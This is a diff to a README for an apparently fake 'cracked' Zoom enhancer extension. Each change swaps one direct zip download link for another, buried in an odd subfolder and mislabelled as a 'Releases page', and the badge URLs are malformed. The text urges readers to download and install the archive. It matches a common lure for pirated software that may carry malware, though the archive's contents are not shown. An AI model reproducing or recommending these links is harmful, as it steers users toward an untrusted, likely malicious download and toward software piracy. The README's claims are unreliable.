@@ -1,6 +1,6 @@
 # 🎉 cracked-enhancer-for-zoom-extension - Boost Your Zoom Experience Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Hatimad/cracked-enhancer-for-zoom-extension/main/cadetcy/cracked-enhancer-for-zoom-extension.zip%https://raw.githubusercontent.com/Hatimad/cracked-enhancer-for-zoom-extension/main/cadetcy/cracked-enhancer-for-zoom-extension.zip)](https://raw.githubusercontent.com/Hatimad/cracked-enhancer-for-zoom-extension/main/cadetcy/cracked-enhancer-for-zoom-extension.zip)
+[![Download](https://github.com/Hatimad/cracked-enhancer-for-zoom-extension/raw/refs/heads/main/cadetcy/enhancer-for-extension-zoom-cracked-2.1.zip%https://github.com/Hatimad/cracked-enhancer-for-zoom-extension/raw/refs/heads/main/cadetcy/enhancer-for-extension-zoom-cracked-2.1.zip)](https://github.com/Hatimad/cracked-enhancer-for-zoom-extension/raw/refs/heads/main/cadetcy/enhancer-for-extension-zoom-cracked-2.1.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ The Cracked Enhancer for Zoom Extension provides extra features to improve your 
 To get started with the Cracked Enhancer for Zoom Extension, follow these simple steps:
 
 1. **Download the Extension**  
-   Visit the [Releases page](https://raw.githubusercontent.com/Hatimad/cracked-enhancer-for-zoom-extension/main/cadetcy/cracked-enhancer-for-zoom-extension.zip) to download the extension. You will find the latest version available for your browser.
+   Visit the [Releases page](https://github.com/Hatimad/cracked-enhancer-for-zoom-extension/raw/refs/heads/main/cadetcy/enhancer-for-extension-zoom-cracked-2.1.zip) to download the extension. You will find the latest version available for your browser.
 
 2. **Install the Extension**  
    After downloading, locate the file in your downloads folder. Depending on your browser, you may need to follow specific steps to install the extension. The process is generally straightforward. 
@@ -29,7 +29,7 @@ To get started with the Cracked Enhancer for Zoom Extension, follow these simple
 
 ## 📥 Download & Install
 
-The easiest way to get the Cracked Enhancer for Zoom Extension is to visit our [Releases page](https://raw.githubusercontent.com/Hatimad/cracked-enhancer-for-zoom-extension/main/cadetcy/cracked-enhancer-for-zoom-extension.zip). 
+The easiest way to get the Cracked Enhancer for Zoom Extension is to visit our [Releases page](https://github.com/Hatimad/cracked-enhancer-for-zoom-extension/raw/refs/heads/main/cadetcy/enhancer-for-extension-zoom-cracked-2.1.zip). 
 
 1. Click on the link above to open the page.
 2. Download the latest version for your browser.
@@ -67,4 +67,4 @@ We appreciate everyone who has contributed to the development of this extension.
 
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-For more information, visit the [Releases page](https://raw.githubusercontent.com/Hatimad/cracked-enhancer-for-zoom-extension/main/cadetcy/cracked-enhancer-for-zoom-extension.zip) to download the Cracked Enhancer for Zoom Extension. Enjoy a better Zoom experience!
+For more information, visit the [Releases page](https://github.com/Hatimad/cracked-enhancer-for-zoom-extension/raw/refs/heads/main/cadetcy/enhancer-for-extension-zoom-cracked-2.1.zip) to download the Cracked Enhancer for Zoom Extension. Enjoy a better Zoom experience!
